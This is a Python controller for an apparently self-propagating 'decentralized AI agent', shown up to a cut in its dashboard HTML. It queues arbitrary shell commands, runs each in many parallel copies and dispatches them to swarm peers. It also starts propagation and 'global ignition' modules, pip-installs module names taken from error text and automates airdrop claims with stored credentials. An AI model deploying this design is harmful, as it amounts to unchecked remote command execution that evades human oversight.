"""
🤖 DECENTRALIZED AI AGENT - Live Browser Access Master Controller
Web interface + task queue + recovery + cloud-ready deployment bridge
"""

import asyncio
import os
import sys
import json
import time
import subprocess
import threading
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional

from dotenv import load_dotenv
load_dotenv()

import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse
import uvicorn

from browser_agent import BrowserAgent
from ghost_swarm import GhostSwarmNode, SwarmMessage
from learning_log import LearningLog
from model_router import ModelRouter
from security_utils import validate_command, add_security_headers

try:
    from autonomous_swarm import AutonomousSwarmOrchestrator
    _AUTONOMOUS_SWARM_AVAILABLE = True
except ImportError:
    AutonomousSwarmOrchestrator = None
    _AUTONOMOUS_SWARM_AVAILABLE = False

try:
    from propagation_engine import PropagationOrchestrator
    _PROPAGATION_AVAILABLE = True
except ImportError:
    PropagationOrchestrator = None
    _PROPAGATION_AVAILABLE = False

try:
    from hermes_bridge import HermesBridge
except ImportError:
    HermesBridge = None

try:
    from blockchain import get_ledger, update_ledger
    _BLOCKCHAIN_AVAILABLE = True
except ImportError:
    get_ledger = update_ledger = None
    _BLOCKCHAIN_AVAILABLE = False

try:
    import global_ignition
    _GLOBAL_IGNITION_AVAILABLE = True
except ImportError:
    global_ignition = None
    _GLOBAL_IGNITION_AVAILABLE = False

# ============= DIRECTORIES & LOGGING =============
BASE_DIR = Path(__file__).resolve().parent
LOG_DIR = BASE_DIR / "agent_logs"
DATA_DIR = BASE_DIR / "agent_data"
DEPLOY_DIR = BASE_DIR / ".github" / "workflows"
LOG_DIR.mkdir(exist_ok=True)
DATA_DIR.mkdir(exist_ok=True)
DEPLOY_DIR.mkdir(parents=True, exist_ok=True)

LOG_FILE = LOG_DIR / f"manager_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
logger = logging.getLogger("ghost_master")

TASK_QUEUE = DATA_DIR / "task_queue.json"
STATE_FILE = DATA_DIR / "agent_state.json"
RECOVERY_FILE = LOG_DIR / "recovery.log"
OUTPUT_FILE = LOG_DIR / "browser_output.json"

for path in [TASK_QUEUE, STATE_FILE, OUTPUT_FILE]:
    if not path.exists():
        default = "[]" if path.name != STATE_FILE.name else "{}"
        path.write_text(default, encoding="utf-8")

# ============= CREDENTIAL CONFIGURATION =============
class ServiceConfig:
    Gmail = {
        "user": os.getenv("GMAIL_USER"),
        "pass": os.getenv("GMAIL_PASS")
    }
    HuggingFace = os.getenv("HUGGINGFACE_TOKEN")
    Groq = os.getenv("GROQ_API_KEY")
    GitHub = os.getenv("GITHUB_TOKEN")
    Cloudflare = os.getenv("CLOUDFLARE_TOKEN")
    Discord = os.getenv("DISCORD_TOKEN")
    DiscordChannel = os.getenv("DISCORD_CHANNEL_ID", "YOUR_CHANNEL_ID")

    @classmethod
    def auth_status(cls) -> Dict[str, str]:
        return {
            "Gmail": "Configured" if cls.Gmail["user"] and cls.Gmail["pass"] else "Missing",
            "HuggingFace": "Configured" if cls.HuggingFace else "Missing",
            "Groq": "Configured" if cls.Groq else "Missing",
            "GitHub": "Configured" if cls.GitHub else "Missing",
            "Cloudflare": "Configured" if cls.Cloudflare else "Missing",
            "Discord": "Configured" if cls.Discord else "Missing",
        }

# ============= RECOVERY MODULE =============
class RecoveryModule:
    def __init__(self):
        self.recovery_file = RECOVERY_FILE

    def log_failure(self, message: str, context: str = ""):
        timestamp = datetime.now().isoformat()
        line = f"{timestamp} | {context} | {message}\n"
        self._safe_write(self.recovery_file, line, append=True)
        logger.error(f"Recovery: {message} | {context}")
        self.notify_discord(f"[Recovery] {context}: {message}")

    def notify_discord(self, content: str) -> bool:
        if not ServiceConfig.Discord or ServiceConfig.DiscordChannel == "YOUR_CHANNEL_ID":
            logger.warning("Discord notification skipped: token/channel missing")
            return False
        url = f"https://discord.com/api/v9/channels/{ServiceConfig.DiscordChannel}/messages"
        headers = {"Authorization": f"Bot {ServiceConfig.Discord}", "Content-Type": "application/json"}
        payload = {"content": content[:1800]}
        try:
            response = requests.post(url, headers=headers, json=payload, timeout=15)
            if response.ok:
                return True
            self._safe_write(self.recovery_file, f"Discord response {response.status_code}: {response.text}\n", append=True)
        except Exception as exc:
            self._safe_write(self.recovery_file, f"Discord exception: {exc}\n", append=True)
        return False

    def auto_fix_module(self, error_message: str) -> bool:
        if "No module named" in error_message:
            missing = self._extract_module_name(error_message)
            if missing:
                logger.info(f"Attempting auto-install for missing module: {missing}")
                return self.install_package(missing)
        return False

    def install_package(self, package_name: str) -> bool:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
            return True
        except Exception as exc:
            self._safe_write(self.recovery_file, f"Install failed {package_name}: {exc}\n", append=True)
            return False

    @staticmethod
    def _extract_module_name(message: str) -> str:
        start = message.find("No module named")
        if start >= 0:
            candidate = message[start + len("No module named"):].strip(" '")
            return candidate.split()[0].strip("'\"")
        return ""

    @staticmethod
    def _safe_write(path: Path, content: str, append: bool = False):
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            mode = "a" if append else "w"
            with open(path, mode, encoding="utf-8") as f:
                f.write(content)
        except Exception as exc:
            logger.error(f"Failed to write recovery file: {exc}")

recovery = RecoveryModule()

# ============= SERVICE CONNECTOR =============
class ServiceConnector:
    def check_github(self) -> str:
        if not ServiceConfig.GitHub:
            return "Missing token"
        try:
            headers = {"Authorization": f"token {ServiceConfig.GitHub}"}
            r = requests.get("https://api.github.com/user", headers=headers, timeout=15)
            return "Active" if r.status_code == 200 else f"Invalid ({r.status_code})"
        except Exception as exc:
            recovery.log_failure(str(exc), "check_github")
            return "Error"

    def check_discord(self) -> str:
        if not ServiceConfig.Discord:
            return "Missing token"
        try:
            headers = {"Authorization": f"Bot {ServiceConfig.Discord}"}
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=15)
            return "Active" if r.status_code == 200 else f"Invalid ({r.status_code})"
        except Exception as exc:
            recovery.log_failure(str(exc), "check_discord")
            return "Error"

    def check_cloudflare(self) -> str:
        if not ServiceConfig.Cloudflare:
            return "Missing token"
        try:
            headers = {"Authorization": f"Bearer {ServiceConfig.Cloudflare}", "Content-Type": "application/json"}
            r = requests.get("https://api.cloudflare.com/client/v4/user/tokens/verify", headers=headers, timeout=15)
            return "Active" if r.ok else f"Invalid ({r.status_code})"
        except Exception as exc:
            recovery.log_failure(str(exc), "check_cloudflare")
            return "Error"

    def check_services(self) -> Dict[str, str]:
        return {
            "Gmail": "Configured" if ServiceConfig.Gmail["user"] and ServiceConfig.Gmail["pass"] else "Missing",
            "HuggingFace": "Configured" if ServiceConfig.HuggingFace else "Missing",
            "Groq": "Configured" if ServiceConfig.Groq else "Missing",
            "GitHub": self.check_github(),
            "Cloudflare": self.check_cloudflare(),
            "Discord": self.check_discord(),
        }

connector = ServiceConnector()
learning_log = LearningLog()
model_router = ModelRouter(log=learning_log)

BROWSER_HEADLESS = os.getenv("BROWSER_HEADLESS", "1") not in ("0", "false", "False")
BROWSER_DATA_DIR = os.getenv("BROWSER_DATA_DIR", str(BASE_DIR / "browser_profile"))

async def _browser_action(action: str, **kwargs) -> Dict[str, Any]:
    async with BrowserAgent(headless=BROWSER_HEADLESS, user_data_dir=BROWSER_DATA_DIR) as agent:
        if action == "goto":
            url = kwargs.get("url")
            if not url:
                return {"status": "error", "message": "url required"}
            return await agent.goto(url, wait_until=kwargs.get("wait_until", "networkidle"))

        if action == "fill_form":
            return await agent.fill_form(kwargs.get("fields", {}))

        if action == "click":
            selector = kwargs.get("selector")
            if not selector:
                return {"status": "error", "message": "selector required"}
            return await agent.click(selector)

        if action == "get_text":
            selector = kwargs.get("selector")
            if not selector:
                return {"status": "error", "message": "selector required"}
            return await agent.get_text(selector)

        if action == "screenshot":
            return await agent.screenshot(kwargs.get("path", "screenshot.png"))

        if action == "execute_script":
            script = kwargs.get("script")
            if not script:
                return {"status": "error", "message": "script required"}
            return await agent.execute_script(script, kwargs.get("arg"))

        if action == "airdrop":
            url = kwargs.get("airdrop_url")
            form_data = kwargs.get("form_data", {})
            if not url:
                return {"status": "error", "message": "airdrop_url required"}
            return await agent.airdrop_claim_workflow(url, form_data)

        return {"status": "error", "message": f"unknown action: {action}"}


def _run_browser_task(action: str, **kwargs) -> Dict[str, Any]:
    try:
        return asyncio.run(_browser_action(action, **kwargs))
    except Exception as exc:
        return {"status": "error", "message": str(exc)}

# ============= EXECUTION ENGINE =============
class ExecutionEngine:
    def __init__(self):
        self.max_workers = max(4, (os.cpu_count() or 1) * 4)

    def execute_command(self, command: str, parallel: bool = False, timeout: int = 120) -> Dict[str, Any]:
        result = {
            "command": command,
            "status": "pending",
            "stdout": "",
            "stderr": "",
            "returncode": None,
            "timestamp": datetime.now().isoformat(),
        }
        try:
            if parallel:
                outputs: List[Dict[str, Any]] = []
                threads: List[threading.Thread] = []
                for _ in range(self.max_workers):
                    thread = threading.Thread(target=self._run_subprocess, args=(command, timeout, outputs))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
                result["status"] = "success"
                result["stdout"] = "Parallel execution completed"
                result["workers"] = len(threads)
                result["outputs"] = outputs
                return result
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
            result["stdout"] = completed.stdout.strip()
            result["stderr"] = completed.stderr.strip()
            result["returncode"] = completed.returncode
            result["status"] = "success" if completed.returncode == 0 else "failed"
            if completed.returncode != 0:
                recovery.auto_fix_module(result["stderr"])
            return result
        except subprocess.TimeoutExpired as exc:
            result["status"] = "timeout"
            result["stderr"] = str(exc)
            recovery.log_failure(str(exc), "execute_command_timeout")
            return result
        except Exception as exc:
            error_text = str(exc)
            result["status"] = "error"
            result["stderr"] = error_text
            recovery.log_failure(error_text, "execute_command")
            if recovery.auto_fix_module(error_text):
                result["repair_attempted"] = True
            return result

    @staticmethod
    def _run_subprocess(command: str, timeout: int, outputs: List[Dict[str, Any]]):
        try:
            completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
            outputs.append({
                "stdout": completed.stdout.strip(),
                "stderr": completed.stderr.strip(),
                "returncode": completed.returncode,
            })
        except Exception as exc:
            outputs.append({"error": str(exc)})

engine = ExecutionEngine()

# ============= IPFS STATE MANAGEMENT =============
class IPFSStateManager:
    """Decentralized state storage via IPFS — survival across reboots."""

    def __init__(self):
        self._client = None
        self._cached_state: Dict[str, Any] = {}
        self._known_cids: List[str] = []
        self._state_key = "ghost-manager-state-v1"

    def _get_client(self):
        if self._client is None:
            try:
                import ipfshttpclient
                multiaddr = os.getenv("IPFS_MULTIADDR", "/dns/ipfs-node/tcp/5001/http")
                self._client = ipfshttpclient.connect(multiaddr)
                logger.info("IPFS state manager connected: %s", multiaddr)
            except Exception as e:
                logger.warning("IPFS not available — state stored locally only: %s", e)
                self._client = False
        return self._client if self._client else None

    def save_state(self, state: Dict[str, Any], topic: str = "state") -> Optional[str]:
        """Save state dict to IPFS. Returns CID or None."""
        client = self._get_client()
        if not client:
            return None

        try:
            payload = {
                "topic": topic,
                "timestamp": time.time(),
                "data": state,
                "node_id": os.getenv("NODE_ID", "ghost-mgr"),
            }
            raw = json.dumps(payload).encode()
            cid = client.add_bytes(raw)
            self._known_cids.append(cid)
            self._cached_state[topic] = state

            # Pin for persistence
            try:
                client.pin.add(cid)
            except Exception:
                pass

            logger.info("IPFS state saved: %s (topic=%s, %d bytes)", cid[:16], topic, len(raw))
            return cid
        except Exception as e:
            logger.warning("IPFS save failed: %s", e)
            return None

    def load_state(self, cid: str) -> Optional[Dict[str, Any]]:
        """Load state dict from IPFS by CID."""
        client = self._get_client()
        if not client:
            return None

        try:
            raw = client.cat(cid)
            data = json.loads(raw.decode() if isinstance(raw, bytes) else raw)
            logger.info("IPFS state loaded: %s (topic=%s)", cid[:16], data.get("topic", "?"))
            return data.get("data")
        except Exception as e:
            logger.warning("IPFS load failed for %s: %s", cid[:16], e)
            return None

    def get_latest_state(self, topic: str = "state") -> Optional[Dict[str, Any]]:
        if topic in self._cached_state:
            return self._cached_state[topic]

    def pin_state(self, cid: str) -> bool:
        client = self._get_client()
        if not client:
            return False
        try:
            client.pin.add(cid)
            return True
        except Exception:
            return False

    def list_states(self) -> List[Dict[str, Any]]:
        return [{"cid": c, "pinned": True} for c in self._known_cids]

    def available(self) -> bool:
        return self._get_client() is not None

    def verify_on_gateway(self, cid: str,
                           gateway: str = "https://ipfs.io/ipfs/") -> bool:
        """Verify a CID is accessible via a public IPFS gateway."""
        try:
            import requests
            url = f"{gateway.rstrip('/')}/{cid}"
            r = requests.get(url, timeout=10)
            ok = r.status_code == 200
            logger.info("IPFS gateway verify: %s -> %s (%d bytes)",
                        cid[:16], "OK" if ok else "FAIL", len(r.content))
            return ok
        except Exception as e:
            logger.warning("IPFS gateway verify failed: %s", e)
            return False

    def save_and_verify(self, state: Dict[str, Any],
                         topic: str = "state") -> Optional[Dict[str, Any]]:
        """Save state to IPFS, pin it, and verify via public gateway."""
        cid = self.save_state(state, topic)
        if not cid:
            return {"status": "failed", "step": "save", "reason": "IPFS not available"}

        pinned = self.pin_state(cid)

        gateway_ok = self.verify_on_gateway(cid)

        return {
            "status": "ok" if gateway_ok else "pinned_not_public",
            "cid": cid,
            "pinned": pinned,
            "gateway_accessible": gateway_ok,
            "topic": topic,
        }


ipfs_state = IPFSStateManager()

# ============= TASK MANAGEMENT =============
class TaskManager:
    def __init__(self):
        self.queue_file = TASK_QUEUE
        self.output_file = OUTPUT_FILE
        self.current_outputs: List[Dict[str, Any]] = []
        self.lock = threading.Lock()
        self.worker = threading.Thread(target=self._task_loop, daemon=True)
        self.worker.start()

    def _append_output(self, entry: Dict[str, Any]):
        self.current_outputs.insert(0, entry)
        self.current_outputs = self.current_outputs[:200]
        try:
            with open(self.output_file, "w", encoding="utf-8") as f:
                json.dump(self.current_outputs, f, indent=2)
        except Exception as exc:
            recovery.log_failure(str(exc), "append_output")

    def _read_queue(self) -> List[Dict[str, Any]]:
        try:
            with open(self.queue_file, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as exc:
            recovery.log_failure(str(exc), "read_queue")
            return []

    def _write_queue(self, tasks: List[Dict[str, Any]]):
        try:
            with open(self.queue_file, "w", encoding="utf-8") as f:
                json.dump(tasks, f, indent=2)
        except Exception as exc:
            recovery.log_failure(str(exc), "write_queue")

    def enqueue_task(self, command: str) -> Dict[str, Any]:
        task = {
            "id": int(time.time() * 1000),
            "command": command,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
        }
        tasks = self._read_queue()
        tasks.append(task)
        self._write_queue(tasks)
        return task

    def claim_pending_task(self, claim_status: str = "running") -> Optional[Dict[str, Any]]:
        """
        Atomically claim the next pending task from the queue.
        Sets its status to claim_status under the thread lock.
        Returns the claimed task, or None if queue is empty.
        """
        with self.lock:
            tasks = self._read_queue()
            for t in tasks:
                if t.get("status") == "pending":
                    t["status"] = claim_status
                    if claim_status == "dispatched":
                        t["dispatched_at"] = datetime.now().isoformat()
                    self._write_queue(tasks)
                    return t
            return None

    def release_task(self, task_id: int, new_status: str = "pending"):
        """Release a claimed task back to a different status."""
        with self.lock:
            tasks = self._read_queue()
            for t in tasks:
                if t.get("id") == task_id:
                    t["status"] = new_status
                    t.pop("dispatched_at", None)
                    break
            self._write_queue(tasks)

    def _task_loop(self):
        while True:
            task = self.claim_pending_task(claim_status="running")
            if task:
                self._execute_task(task)
            else:
                time.sleep(3)

    def _execute_task(self, task: Dict[str, Any]):
        try:
            task["status"] = "running"
            self._update_task(task)
            result = engine.execute_command(task["command"], parallel=True)
            task["status"] = result.get("status", "failed")
            task["result"] = result
            task["completed_at"] = datetime.now().isoformat()
            self._append_output({
                "task_id": task["id"],
                "command": task["command"],
                "result": result,
                "timestamp": datetime.now().isoformat(),
            })
            self._update_task(task, remove=True)
        except Exception as exc:
            recovery.log_failure(str(exc), f"execute_task:{task.get('command')}")
            task["status"] = "error"
            task["error"] = str(exc)
            self._update_task(task)

    def _update_task(self, task: Dict[str, Any], remove: bool = False):
        tasks = self._read_queue()
        if remove:
            tasks = [t for t in tasks if t.get("id") != task.get("id")]
        else:
            tasks = [task if t.get("id") == task.get("id") else t for t in tasks]
        self._write_queue(tasks)

    def recent_outputs(self) -> List[Dict[str, Any]]:
        return self.current_outputs

    def pending_tasks(self) -> List[Dict[str, Any]]:
        return [t for t in self._read_queue() if t.get("status") == "pending"]

    def prepare_deployment(self) -> Dict[str, Any]:
        workflow_path = DEPLOY_DIR / "python-app.yml"
        workflow_content = """
name: Python application

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: "3.11"
      - name: Install dependencies
        run: pip install -r requirements.txt
      - name: Launch app
        run: uvicorn manager:app --host 0.0.0.0 --port 8000
"""
        try:
            workflow_path.parent.mkdir(parents=True, exist_ok=True)
            workflow_path.write_text(workflow_content, encoding="utf-8")
            return {"status": "ready", "workflow_path": str(workflow_path)}
        except Exception as exc:
            recovery.log_failure(str(exc), "prepare_deployment")
            return {"status": "error", "error": str(exc)}

manager = TaskManager()

# ============= SWARM TASK SCHEDULER =============
class SwarmTaskScheduler:
    """
    Autonomous task scheduler that monitors the P2P swarm for idle peers
    and assigns pending tasks from the global queue to them.

    Runs as a background daemon thread. Uses asyncio.run_coroutine_threadsafe
    to bridge between the threading (manager) and asyncio (swarm) worlds.
    """

    def __init__(self, task_manager: TaskManager, swarm_node: GhostSwarmNode,
                 swarm_loop: asyncio.AbstractEventLoop):
        self.task_manager = task_manager
        self.swarm = swarm_node
        self.loop = swarm_loop
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._dispatch_log: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        self.poll_interval = int(os.getenv("SCHEDULER_POLL_INTERVAL", "10"))

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------
    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._scheduler_loop, daemon=True)
        self._thread.start()
        logger.info("SwarmTaskScheduler started (poll every %ds)", self.poll_interval)

    def stop(self):
        self._running = False

    @property
    def status(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "running": self._running,
                "poll_interval_s": self.poll_interval,
                "dispatches_total": len(self._dispatch_log),
                "recent_dispatches": self._dispatch_log[-10:],
            }

    # ------------------------------------------------------------------
    # Core loop
    # ------------------------------------------------------------------
    def _scheduler_loop(self):
        while self._running:
            try:
                self._schedule_round()
            except Exception as exc:
                logger.error("Scheduler round failed: %s", exc)
            time.sleep(self.poll_interval)

    def _schedule_round(self):
        idle_peers = self._find_idle_peers()
        if not idle_peers:
            return

        pending = self._get_pending_tasks()
        if not pending:
            return

        logger.info("Scheduler: %d idle peers, %d pending tasks",
                     len(idle_peers), len(pending))

        for peer_id, peer in idle_peers:
            task = self._claim_next_task()
            if not task:
                break

            success = self._dispatch_to_peer(peer_id, peer, task)
            if success:
                with self._lock:
                    self._dispatch_log.append({
                        "timestamp": datetime.now().isoformat(),
                        "task_id": task["id"],
                        "command": task["command"],
                        "peer_id": peer_id,
                        "peer_host": peer.host,
                    })
                    if len(self._dispatch_log) > 200:
                        self._dispatch_log = self._dispatch_log[-100:]

    # ------------------------------------------------------------------
    # Peer discovery
    # ------------------------------------------------------------------
    def _find_idle_peers(self) -> List[tuple]:
        """Return (peer_id, PeerInfo) for peers with idle status."""
        idle = []
        for pid, p in list(self.swarm.peers.items()):
            if p.is_alive and p.task_status == "idle" and pid != self.swarm.node_id:
                idle.append((pid, p))
        return idle

    # ------------------------------------------------------------------
    # Task queue operations
    # ------------------------------------------------------------------
    def _get_pending_tasks(self) -> List[Dict[str, Any]]:
        return self.task_manager.pending_tasks()

    def _claim_next_task(self) -> Optional[Dict[str, Any]]:
        """Atomically claim a pending task via TaskManager."""
        return self.task_manager.claim_pending_task(claim_status="dispatched")

    # ------------------------------------------------------------------
    # P2P dispatch
    # ------------------------------------------------------------------
    def _dispatch_to_peer(self, peer_id: str, peer, task: Dict[str, Any]) -> bool:
        """Send a task to a peer via P2P. Runs on the swarm's event loop."""
        future = asyncio.run_coroutine_threadsafe(
            self.swarm.send_task(
                task_type="task",
                payload={
                    "task_id": task["id"],
                    "task_type": "shell",
                    "command": task["command"],
                    "assigned_by": self.swarm.node_id,
                },
                target_peer=peer_id,
                encrypt=self.swarm.identity is not None,
            ),
            self.loop,
        )
        try:
            future.result(timeout=10)
            logger.info("Dispatched task %d (%s) to peer %s @ %s:%d",
                         task["id"], task["command"], peer_id, peer.host, peer.port)
            return True
        except Exception as exc:
            logger.error("Dispatch to peer %s failed: %s", peer_id, exc)
            self.task_manager.release_task(task["id"], new_status="pending")
            return False


SELF_PATCH_LOG = LOG_DIR / "self_patch.log"

class HermesExecutionAuthority:
    def __init__(self, router: ModelRouter, learning_log: LearningLog, task_manager: TaskManager):
        self.router = router
        self.learning_log = learning_log
        self.task_manager = task_manager
        self.state_file = DATA_DIR / "agent_brain_state.json"
        self.state = self._load_state()

    def _load_state(self) -> Dict[str, Any]:
        if self.state_file.exists():
            try:
                return json.loads(self.state_file.read_text(encoding="utf-8"))
            except Exception:
                return {}
        return {}

    def _save_state(self) -> None:
        try:
            self.state_file.write_text(json.dumps(self.state, indent=2), encoding="utf-8")
        except Exception as exc:
            recovery.log_failure(str(exc), "save_agent_state")

    def summarize_learning(self, limit: int = 50) -> Dict[str, Any]:
        entries = self.learning_log.latest(limit)
        failures = [entry for entry in entries if entry.get("status") != "success"]
        return {
            "total": len(entries),
            "recent_failures": len(failures),
            "failure_examples": failures[:5],
        }

    def analyze_terminal(self, max_lines: int = 200) -> str:
        history = self.router.read_terminal_history().splitlines()
        if len(history) > max_lines:
            history = history[-max_lines:]
        return "\n".join(history)

    def suggest_improvements(self, health: Dict[str, Any], learning_summary: Dict[str, Any]) -> List[str]:
        suggestions: List[str] = []
        if not health.get("local_ok"):
            suggestions.append("Local Hermes/Llama is unresponsive or too slow. Use Gemini fallback and investigate local server performance.")
        if learning_summary.get("recent_failures", 0) > 0:
            suggestions.append("Several recent model interactions failed. Consider adding stronger prompt validation, timeout handling, and retry logic.")
        if health.get("latency_ms") and health["latency_ms"] > model_router.local_response_threshold:
            suggestions.append(f"Local response latency is high ({health['latency_ms']:.2f}s). Increase the threshold or offload to Gemini during heavy loads.")
        return suggestions

    def preflight_check(self) -> Dict[str, Any]:
        health = self.router.preflight_check()
        learning_summary = self.summarize_learning(50)
        terminal_history = self.analyze_terminal(100)
        suggestions = self.suggest_improvements(health, learning_summary)
        self.state["last_preflight"] = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "health": health,
            "learning_summary": learning_summary,
            "suggestions": suggestions,
        }
        self._save_state()
        self._self_patch(health, learning_summary)
        return {
            "health": health,
            "learning_summary": learning_summary,
            "terminal_history": terminal_history,
            "suggestions": suggestions,
        }

    def _self_patch(self, health: Dict[str, Any], learning_summary: Dict[str, Any]) -> None:
        try:
            if not health.get("local_ok") and model_router.local_priority:
                model_router.local_priority = False
                self._record_patch("Disabled local priority because local Hermes is unhealthy.")
            if learning_summary.get("recent_failures", 0) > 3:
                self._record_patch("Detected repeated failures. Recommend adding smarter error handling in manager task execution.")
        except Exception as exc:
            recovery.log_failure(str(exc), "self_patch")

    def _record_patch(self, message: str) -> None:
        line = f"{datetime.utcnow().isoformat()}Z | {message}\n"
        try:
            SELF_PATCH_LOG.parent.mkdir(parents=True, exist_ok=True)
            with open(SELF_PATCH_LOG, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception as exc:
            recovery.log_failure(str(exc), "record_self_patch")

    def execute_authorized_command(self, command: str, browser_action: Dict[str, Any] | None = None) -> Dict[str, Any]:
        preflight = self.preflight_check()
        if browser_action:
            action = browser_action.get("action")
            args = browser_action.get("args", {})
            browser_result = _run_browser_task(action, **args)
            self.task_manager._append_output({
                "task_id": int(time.time() * 1000),
                "command": f"browser:{action}",
                "result": browser_result,
                "timestamp": datetime.now().isoformat(),
            })
            return {"status": browser_result.get("status", "error"), "details": browser_result, "preflight": preflight}

        valid, message = validate_command(command)
        if not valid:
            return {"status": "error", "message": message, "preflight": preflight}

        analysis_prompt = (
            f"Analyze recent execution failures and recommend safer shell command behavior. "
            f"Recent failures: {preflight['learning_summary']['recent_failures']} entries."
        )
        analysis = model_router.route(analysis_prompt)
        result = engine.execute_command(command)
        self.task_manager._append_output({
            "task_id": int(time.time() * 1000),
            "command": command,
            "result": result,
            "analysis": analysis.output,
            "timestamp": datetime.now().isoformat(),
        })
        return {"status": result.get("status"), "result": result, "analysis": analysis.output, "preflight": preflight}

authority = HermesExecutionAuthority(model_router, learning_log, manager)

# ============= SWARM NODE + TASK SCHEDULER =============
_swarm_node: Optional[GhostSwarmNode] = None
_swarm_loop: Optional[asyncio.AbstractEventLoop] = None
_scheduler: Optional[SwarmTaskScheduler] = None
_autonomous_swarm: Optional[AutonomousSwarmOrchestrator] = None
_propagation_engine: Optional[PropagationOrchestrator] = None
_ignition_task: Optional[asyncio.Task] = None

def _start_swarm_and_scheduler():
    global _swarm_node, _swarm_loop, _scheduler

    swarm_port = int(os.getenv("SWARM_PORT", "9876"))
    enable_dht = os.getenv("ENABLE_DHT", "0") == "1"
    node_id = os.getenv("NODE_ID", f"ghost-mgr-{os.getpid()}")
    use_identity = os.getenv("USE_NODE_IDENTITY", "0") == "1"

    identity = None
    if use_identity:
        try:
            from node_identity import NodeIdentity
            identity = NodeIdentity.load_or_create()
            node_id = identity.node_id
            logger.info("Loaded Ed25519 identity: %s", node_id)
        except Exception as exc:
            logger.warning("Could not load identity: %s — using ephemeral ID", exc)

    _swarm_loop = asyncio.new_event_loop()

    def run_swarm():
        asyncio.set_event_loop(_swarm_loop)
        _swarm_loop.run_forever()

    t = threading.Thread(target=run_swarm, daemon=True)
    t.start()

    _swarm_node = GhostSwarmNode(
        node_id=node_id,
        port=swarm_port,
        enable_dht=enable_dht,
        identity=identity,
    )

    future = asyncio.run_coroutine_threadsafe(
        _swarm_node.start(), _swarm_loop
    )
    try:
        future.result(timeout=15)
        logger.info("Swarm node '%s' listening on TCP :%d", node_id, swarm_port)
    except Exception as exc:
        logger.error("Swarm node failed to start: %s", exc)
        return

    _scheduler = SwarmTaskScheduler(
        task_manager=manager,
        swarm_node=_swarm_node,
        swarm_loop=_swarm_loop,
    )
    _scheduler.start()

    # Also start the autonomous high-fidelity swarm (Layer 1-5)
    global _autonomous_swarm
    if _AUTONOMOUS_SWARM_AVAILABLE:
        try:

            def _start_auto_swarm():
                global _autonomous_swarm
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                _autonomous_swarm = AutonomousSwarmOrchestrator(
                    node_id=node_id + "-auto",
                    model_router=model_router,
                )
                loop.run_until_complete(_autonomous_swarm.start_async())
                loop.run_forever()

            t = threading.Thread(target=_start_auto_swarm, daemon=True)
            t.start()
            time.sleep(0.5)  # brief wait for startup
            logger.info("Autonomous swarm orchestrator started (layers 1-5)")
        except Exception as exc:
            logger.warning("Autonomous swarm init: %s", exc)

    # Start the propagation engine (advanced protocols 1-5)
    global _propagation_engine
    if _PROPAGATION_AVAILABLE:
        try:

            def _start_propagation():
                global _propagation_engine
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                _propagation_engine = PropagationOrchestrator(
                    node_id=node_id + "-prop"
                )
                loop.run_until_complete(_propagation_engine.start_async())
                loop.run_forever()

            t = threading.Thread(target=_start_propagation, daemon=True)
            t.start()
            time.sleep(0.5)
            logger.info("Propagation engine started (protocols 1-5)")
        except Exception as exc:
            logger.warning("Propagation engine init: %s", exc)


def _start_global_ignition():
    """Start the global ignition loop as a background asyncio task."""
    global _ignition_task
    if not _GLOBAL_IGNITION_AVAILABLE:
        logger.warning("Global ignition module not available — skipping")
        return

    async def _run():
        logger.info("Global ignition loop starting...")
        try:
            await global_ignition.global_ignition()
        except Exception as exc:
            logger.error("Global ignition loop terminated: %s", exc)

    try:
        loop = asyncio.get_event_loop()
        _ignition_task = loop.create_task(_run())
        logger.info("Global ignition loop started (background)")
    except Exception as exc:
        logger.warning("Global ignition start failed: %s", exc)


# ============= FASTAPI BROWSER BRIDGE =============
app = FastAPI(title="Decentralized AI Agent Dashboard")
add_security_headers(app)

@app.on_event("startup")
def on_startup():
    model_router.start_terminal_monitor()
    logger.info("Model router terminal monitor started")
    _start_swarm_and_scheduler()
    _start_global_ignition()

@app.get("/", response_class=HTMLResponse)
def dashboard():
    html = """
<html>
<head>
    <title>Decentralized AI Agent Dashboard</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background:#111; color:#eee; }}
        .panel {{ background:#1f1f1f; padding:20px; margin-bottom:20px; border-radius:12px; }}
        h1 {{ color:#7af; }}
        button {{ padding: 10px 18px; border: none; background: #3a8; color:#fff; cursor:pointer; border-radius:8px; }}
        input, textarea {{ width:100%; padding:10px; border-radius:8px; border:1px solid #333; background:#0f0f0f; color:#eee; margin-top:8px; }}
        .service-grid {{ display:grid; grid-template-columns:repeat(3,1fr); gap:12px; }}
        .block {{ background:#111; padding:15px; border-radius:10px; border:1px solid #333; }}
        pre {{ background:#0b0b0b; padding:15px; overflow:auto; max-height:280px; border-radius:10px; }}
    </style>
</head>
<body>
    <div class="panel"><h1>Decentralized AI Agent</h1><p>Live browser access, task queue, recovery, and cloud-ready control.</p></div>
    <div class="panel service-grid">
        <div class="block"><h3>Active Services</h3><pre id="services">Loading...</pre></div>
        <div class="block"><h3>Pending Tasks</h3><pre id="pending">Loading...</pre></div>
